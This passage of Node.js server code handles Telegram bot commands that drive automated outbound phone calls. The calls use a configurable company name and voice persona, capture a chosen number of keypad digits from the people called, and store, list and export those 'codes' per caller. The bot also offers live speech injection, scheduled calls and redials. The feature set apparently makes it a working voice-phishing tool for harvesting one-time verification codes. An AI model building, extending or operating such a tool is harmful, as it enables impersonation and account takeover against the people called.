  const id = String(text.split(" ")[1] || "").trim();
  if (!id) {
    await tgSend(chatId, "Usage: /addadmin TELEGRAM_ID");
    return res.sendStatus(200);
  }
  db.adminIds = db.adminIds || [];
  if (!getAdminIds().includes(id)) {
    db.adminIds.push(id);
    ensureUser(id);
    saveDB();
  }
  await tgSend(chatId, `🛡 Admin added: ${id}`);
  return res.sendStatus(200);
}

if (text.startsWith("/removeadmin")) {
  if (!ownerOnly(chatId)) {
    await tgSend(chatId, "Owner only");
    return res.sendStatus(200);
  }
  const id = String(text.split(" ")[1] || "").trim();
  db.adminIds = (db.adminIds || []).filter((x) => String(x) !== id);
  saveDB();
  await tgSend(chatId, `🗑 Admin removed: ${id}`);
  return res.sendStatus(200);
}

if (text === "/admins") {
  const ids = getAdminIds();
  await tgSend(chatId, ids.length ? "🛡 Admins\n\n" + ids.join("\n") : "No admins");
  return res.sendStatus(200);
}

if (text === "/calls") {
  const activeCalls = sortedCallsForUser(chatId).filter((c) => c.status !== "Ended");
  if (!activeCalls.length) {
    await tgSend(chatId, "No active calls");
  } else {
    let out = "📋 Active Calls\n\n";
    activeCalls.forEach((c, i) => {
      out += `${i + 1}. ${c.caller || "Unknown"} | ${c.status} | ${c.input || "waiting"}\n`;
    });
    await tgSend(chatId, out.trim());
  }
  return res.sendStatus(200);
}


      if (user.pendingInput === "call" && !text.startsWith("/")) {
        user.pendingInput = null;
        saveDB();
        await startCall(text, chatId);
        await tgSend(chatId, `📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (user.pendingInput === "talk" && !text.startsWith("/")) {
        const activeCall = newestActiveCallForUser(chatId);
        user.pendingInput = null;
        saveDB();
        if (!activeCall || !activeCall.sid) {
          await tgSend(chatId, "No active call to talk into");
          return res.sendStatus(200);
        }
        await updateLiveCallTwiml(activeCall.sid, buildTalkTwiml(activeCall, text));
        await tgSend(chatId, "🎤 Sent to call");
        return res.sendStatus(200);
      }

      if (text === "/panel" || text === "/menu" || text === "/status" || text === "/start") {
        user.panelMessageId = null;
        saveDB();
        await updatePanel(chatId, true);
        return res.sendStatus(200);
      }

      if (text === "/help" || text === "/commands") {
        let commands = `🤖 Commands

/panel
/menu
/status
/logs
/history
/stats
/codes
/call +number
/calllast
/digits X
/assistant X
/company NAME
/item NAME
/profile NAME
/saveprofile NAME
/deleteprofile NAME
/profiles
/maxretries X
/timeout X
/autoconfirm X
/autohangup X
/quickdials
/schedule +number 10m
/settings
/calls
/delay X
/admins`;


        if (ownerOnly(chatId)) {
          commands += `

/clearcodes
/export
/pause
/resume
/stop
/addadmin ID
/removeadmin ID`;

        }

        await tgSend(chatId, commands);
        return res.sendStatus(200);
      }

      if (text === "/settings") {
        await tgSend(
          chatId,
          `⚙ Current Settings

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistant().name}
Item: ${settings.itemName}
Max Retries: ${settings.maxRetries}
Input Timeout: ${settings.inputTimeout}
Auto Confirm: ${settings.autoConfirmSec}
Auto Hangup: ${settings.autoHangupSec}
Answer Delay: ${settings.answerDelay || 0}
Paused: ${settings.paused ? "Yes" : "No"}
Role: ${role}`
        );
        return res.sendStatus(200);
      }

      if (text === "/logs") {
        let out = "📜 Logs\n\n";
        out += db.logs.length ? db.logs.slice(0, 25).join("\n") : "No logs";
        await tgSend(chatId, out);
        return res.sendStatus(200);
      }

      if (text === "/history") {
        let out = "🗂 History\n\n";
        out += db.history.length
          ? db.history.slice(0, 30).join("\n")
          : "No history";
        await tgSend(chatId, out);
        return res.sendStatus(200);
      }

      if (text === "/stats") {
        await tgSend(
          chatId,
          `📈 Stats

Inbound: ${db.stats.inboundCalls}
Outbound: ${db.stats.outboundCalls}
Inputs: ${db.stats.inputsReceived}
Confirmed: ${db.stats.confirmed}
Retries: ${db.stats.retries}
Hung Up: ${db.stats.hungUp}
Auto Confirmed: ${db.stats.autoConfirmed}
Auto Hung Up: ${db.stats.autoHungUp}
Completed: ${db.stats.completedCalls}
Scheduled: ${db.stats.scheduledCalls}`
        );
        return res.sendStatus(200);
      }

      if (text === "/codes") {
        const ownCodes = db.codes.filter(
          (c) => String(c.ownerId) === String(chatId)
        );

        if (!ownCodes.length) {
          await tgSend(chatId, "No saved entries.");
        } else {
          let out = "🗂 Recent Entries\n\n";
          ownCodes.slice(0, 20).forEach((c) => {
            out += `${c.time}\n${c.caller} → ${c.value}\n\n`;
          });
          await tgSend(chatId, out);
        }
        return res.sendStatus(200);
      }

      if (text === "/clearcodes") {
        if (!ownerOnly(chatId)) {
          await tgSend(chatId, "Owner only");
          return res.sendStatus(200);
        }
        db.codes = [];
        saveDB();
        await tgSend(chatId, "Entries cleared");
        return res.sendStatus(200);
      }

      if (text === "/export") {
        if (!ownerOnly(chatId)) {
          await tgSend(chatId, "Owner only");
          return res.sendStatus(200);
        }
        const csv = toCsv(db.codes);
        await tgSendDocument(chatId, "entries.csv", Buffer.from(csv, "utf8"));
        return res.sendStatus(200);
      }

      if (text === "/profiles") {
        const names = Object.keys(db.profiles);
        if (!names.length) {
          await tgSend(chatId, "No saved profiles");
        } else {
          await tgSend(chatId, "📁 Profiles\n\n" + names.join("\n"));
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/saveprofile")) {
        const name = text.split(" ")[1];

        if (!name) {
          await tgSend(chatId, "Usage: /saveprofile name");
        } else {
          db.profiles[name] = {
            company: settings.company,
            digits: settings.digits,
            assistant: settings.assistant,
            itemName: settings.itemName
          };
          saveDB();
          await tgSend(chatId, `✅ Profile saved: ${name}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/profile")) {
        const name = text.split(" ")[1];

        if (!name || !db.profiles[name]) {
          await tgSend(chatId, "Profile not found");
        } else {
          const p = db.profiles[name];
          settings.company = p.company;
          settings.digits = p.digits;
          settings.assistant = p.assistant;
          settings.itemName = p.itemName;
          saveSettings();
          await tgSend(chatId, `📁 Profile loaded: ${name}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/deleteprofile")) {
        const name = text.split(" ")[1];

        if (!name || !db.profiles[name]) {
          await tgSend(chatId, "Profile not found");
        } else {
          delete db.profiles[name];
          saveDB();
          await tgSend(chatId, `🗑 Profile deleted: ${name}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/call ")) {
        const number = text.split(" ")[1];
        if (!number) {
          await tgSend(chatId, "Usage: /call +447xxxxxxxx");
        } else {
          await startCall(number, chatId);
          await tgSend(chatId, `📞 Calling ${number}`);
        }
        return res.sendStatus(200);
      }

      if (text === "/calllast") {
        if (!user.lastDialed) {
          await tgSend(chatId, "No previous outbound call");
        } else {
          await startCall(user.lastDialed, chatId);
          await tgSend(chatId, `📞 Calling ${user.lastDialed}`);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/digits")) {
        const d = parseInt(text.split(" ")[1], 10);
        if (d >= 2 && d <= 10) {
          settings.digits = d;
          saveSettings();
          await tgSend(chatId, `✅ ${d} digits set`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Use /digits 2 to 10");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/assistant")) {
        const a = parseInt(text.split(" ")[1], 10);
        if (a >= 1 && a <= assistants.length) {
          settings.assistant = a - 1;
          saveSettings();
          await tgSend(chatId, `🎙 ${assistant().name} assistant set`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, `Use /assistant 1 to ${assistants.length}`);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/company")) {
        const name = text.replace("/company", "").trim();
        if (!name) {
          await tgSend(chatId, "Usage: /company Support");
        } else {
          settings.company = name;
          saveSettings();
          await tgSend(chatId, `🏢 Company set to ${settings.company}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/item")) {
        const name = text.replace("/item", "").trim();
        if (!name) {
          await tgSend(chatId, "Usage: /item booking number");
        } else {
          settings.itemName = name;
          saveSettings();
          await tgSend(chatId, `📝 Item set to ${settings.itemName}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/maxretries")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 1 && n <= 10) {
          settings.maxRetries = n;
          saveSettings();
          await tgSend(chatId, `🔁 Max retries set to ${n}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Usage: /maxretries 3");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/timeout")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 3 && n <= 30) {
          settings.inputTimeout = n;
          saveSettings();
          await tgSend(chatId, `⏱ Input timeout set to ${n}s`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Usage: /timeout 8");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/autoconfirm")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 0 && n <= 600) {
          settings.autoConfirmSec = n;
          saveSettings();
          await tgSend(chatId, `✅ Auto confirm set to ${n}s`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Usage: /autoconfirm 0");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/autohangup")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 0 && n <= 600) {
          settings.autoHangupSec = n;
          saveSettings();
          await tgSend(chatId, `⛔ Auto hangup set to ${n}s`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Usage: /autohangup 0");
        }
        return res.sendStatus(200);
      }

      if (text === "/pause") {
        if (!ownerOnly(chatId)) {
          await tgSend(chatId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = true;
        saveSettings();
        await tgSend(chatId, "⏸ Calling paused");
        markUserDirty(chatId);
        await updatePanel(chatId);
        return res.sendStatus(200);
      }

      if (text === "/resume") {
        if (!ownerOnly(chatId)) {
          await tgSend(chatId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = false;
        saveSettings();
        await tgSend(chatId, "▶ Calling resumed");
        markUserDirty(chatId);
        await updatePanel(chatId);
        return res.sendStatus(200);
      }

      if (text === "/stop") {
        if (!ownerOnly(chatId)) {
          await tgSend(chatId, "Owner only");
          return res.sendStatus(200);
        }

        const active = Array.from(calls.values()).filter(
          (c) => c.status !== "Ended"
        );
        for (const c of active) {
          try {
            await endLiveCallImmediately(c.sid);
            c.status = "Ended";
            c.endedAt = Date.now();
            removeCallTimers(c);
          } catch {}
        }

        settings.paused = true;
        saveSettings();
        await tgSend(chatId, "🛑 All calls stopped and calling paused");
        markUserDirty(chatId);
        await updatePanel(chatId);
        return res.sendStatus(200);
      }

      if (text === "/quickdials") {
        let out = "📇 Quick Dials\n\n";
        Object.entries(quickDialTargets).forEach(([label, number]) => {
          out += `${label}: ${number || "not set"}\n`;
        });
        await tgSend(chatId, out);
        return res.sendStatus(200);
      }

      if (text.startsWith("/schedule")) {
        const parts = text.split(" ").filter(Boolean);
        const number = parts[1];
        const delayRaw = parts[2];

        if (!number || !delayRaw) {
          await tgSend(chatId, "Usage: /schedule +447xxxxxxxx 10m");
        } else {
          const delayMs = parseDelay(delayRaw);
          if (!delayMs) {
            await tgSend(chatId, "Use delay like 30s, 10m, 1h");
          } else {
            scheduleOutboundCall(number, delayMs, chatId);
            await tgSend(chatId, `⏰ Scheduled ${number} in ${delayRaw}`);
          }
        }

        return res.sendStatus(200);
      }
    }
  } catch (e) {
    console.log("/telegram error:", e.message);
  }

  res.sendStatus(200);
});

// ============================================================
// LIVE PANEL LOOP
// ============================================================

setInterval(async () => {
  try {
    const userIds = Object.keys(db.users);
    for (const chatId of userIds) {
      const user = ensureUser(chatId);
      if (user.dirty && user.panelMessageId) {
        user.dirty = false;
        await updatePanel(chatId);
      }
    }
    cleanupEndedCalls();
  } catch {}
}, 2000);

// ============================================================
// STARTUP
// ============================================================

app.listen(PORT, async () => {
  console.log("Server started");
  console.log("Server booted and ready");

  try {
    if (OWNER_ID) {
      ensureUser(OWNER_ID);
      for (const id of getAdminIds()) ensureUser(id);
      await new Promise((r) => setTimeout(r, 2000));
      await updatePanel(OWNER_ID, true);
      console.log("Owner Telegram panel created");
    }
  } catch (e) {
    console.log("Panel creation error:", e.message);
  }
});
